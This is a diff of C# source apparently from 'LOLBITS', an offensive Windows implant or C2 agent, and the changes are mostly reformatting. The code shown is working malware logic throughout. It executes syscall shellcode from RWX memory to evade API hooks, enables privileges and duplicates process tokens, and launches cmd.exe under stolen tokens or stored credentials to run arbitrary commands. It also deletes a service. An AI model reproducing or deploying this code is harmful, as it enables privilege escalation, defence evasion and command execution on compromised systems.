@@ -70,13 +70,11 @@ namespace LOLBITS
             public LuidAndAttributes[] Privileges;
         }
 
-
         public enum LogonFlags
         {
             WithProfile = 1,
             NetCredentialsOnly
         };
-
 
         [Flags()]
         public enum TokenAccessFlags : int
@@ -98,7 +96,6 @@ namespace LOLBITS
                 TokenAdjustPrivileges | TokenAdjustGroups | TokenAdjustDefault |
                 TokenAdjustSessionId)
         }
-
 
         public enum SecurityImpersonationLevel
         {
@@ -335,6 +332,7 @@ namespace LOLBITS
         {
             ExecuteReadWrite = 0x040,
         }
+
         [DllImport("ntdll.dll")]
         public static extern int NtQuerySystemInformation(SystemInformationClass infoClass, IntPtr info, uint size, out uint length);
 
@@ -411,11 +409,9 @@ namespace LOLBITS
             {
                 if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                     TokenManager.Method = 2;
-
             }
         }
-
-
+        
         // Code from https://www.pinvoke.net/default.aspx/Constants/SECURITY_MANDATORY.html
         public static bool IsHighIntegrity(SysCallManager sysCall)
         {
@@ -447,11 +443,8 @@ namespace LOLBITS
 
                             int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));
 
-                            return dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID ? true : false;
-
-
+                            return dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID;
                         }
-
                     }
                     finally
                     {
@@ -465,14 +458,11 @@ namespace LOLBITS
             }
 
             return false;
-
         }
 
         public static void Start()
         {
-
             SysCallManager sysCall = new SysCallManager();
-
 
             try
             {
@@ -488,28 +478,30 @@ namespace LOLBITS
 
                 IntPtr baseAddress = IntPtr.Zero;
                 byte[] shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
-                var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellCode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
+                var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
+                    MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve,
+                    MemoryProtectionFlags.ExecuteReadWrite);
                 Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
-                var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
+                var sysCallDelegate =
+                    Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
                 IntPtr t = IntPtr.Zero;
-                var arguments = new object[] { Process.GetCurrentProcess().Handle, TokenAccessFlags.TokenAdjustPrivileges, t };
+                var arguments = new object[]
+                    {Process.GetCurrentProcess().Handle, TokenAccessFlags.TokenAdjustPrivileges, t};
                 var returnValue = sysCallDelegate.DynamicInvoke(arguments);
 
-                currentToken = (IntPtr)arguments[2];
+                currentToken = (IntPtr) arguments[2];
                 EnablePrivileges(currentToken, privileges);
 
                 CloseHandle(currentToken);
 
                 TokenAccessFlags tokenAccess = TokenAccessFlags.TokenQuery | TokenAccessFlags.TokenAssignPrimary |
-                TokenAccessFlags.TokenDuplicate | TokenAccessFlags.TokenAdjustDefault |
-                TokenAccessFlags.TokenAdjustSessionId;
+                                               TokenAccessFlags.TokenDuplicate | TokenAccessFlags.TokenAdjustDefault |
+                                               TokenAccessFlags.TokenAdjustSessionId;
 
                 IntPtr newToken = IntPtr.Zero;
-                if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, SecurityImpersonationLevel.SecurityImpersonation, TokenType.TokenPrimary, out newToken))
-                {
+                if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, SecurityImpersonationLevel.SecurityImpersonation,
+                    TokenType.TokenPrimary, out newToken))
                     return;
-
-                }
 
                 StartupInfo startupInfo = new StartupInfo();
                 startupInfo.cb = Marshal.SizeOf(startupInfo);
@@ -520,24 +512,28 @@ namespace LOLBITS
                 ProcessInformation processInfo = new ProcessInformation();
                 LogonFlags l = new LogonFlags();
 
-                if (CreateProcessAsUserW(newToken, @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
+                if (CreateProcessAsUserW(newToken,
+                    @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, IntPtr.Zero,
+                    IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                 {
                     TokenManager.Token = newToken;
                     TokenManager.Method = 1;
-
                 }
                 else
                 {
-                    if (CreateProcessWithTokenW(newToken, l, @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
+                    if (CreateProcessWithTokenW(newToken, l,
+                        @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, 0, IntPtr.Zero,
+                        null, ref startupInfo, out processInfo))
                     {
                         TokenManager.Token = newToken;
                         TokenManager.Method = 2;
-
                     }
                 }
+            }
+            catch
+            {
 
             }
-            catch { }
         }
 
         public static string ExecuteCommand(string command)
@@ -556,14 +552,15 @@ namespace LOLBITS
                 process.StartInfo = startInfo;
                 process.Start();
                 output = process.StandardOutput.ReadToEnd();
+
                 if (output == "")
                     output = string.Concat("ERR:", process.StandardError.ReadToEnd());
+
                 process.WaitForExit();
                 process.Close();
             }
             else
             {
-
                 IntPtr outRead = IntPtr.Zero;
                 IntPtr outWrite = IntPtr.Zero;
 
@@ -590,11 +587,9 @@ namespace LOLBITS
                     CreateProcessAsUserW(TokenManager.Token, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);
 
                 else if (TokenManager.Method == 2)
-
                     CreateProcessWithTokenW(TokenManager.Token, l, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);
 
                 else
-
                     CreateProcessWithLogonW(TokenManager.Credentials[0], TokenManager.Credentials[1], TokenManager.Credentials[2], l, null, @"c:\windows\system32\cmd.exe /Q /C" + command, 0, 0, null, ref startupInfo, out processInfo);
 
 
@@ -609,8 +604,6 @@ namespace LOLBITS
 
                     if (!bSuccess || dwRead < 100)
                         break;
-
-
                 }
 
                 CloseHandle(outRead);
@@ -638,7 +631,6 @@ namespace LOLBITS
                 TokenManager.Credentials[1] = domain;
                 TokenManager.Credentials[2] = password;
             }
-
         }
     }
 }
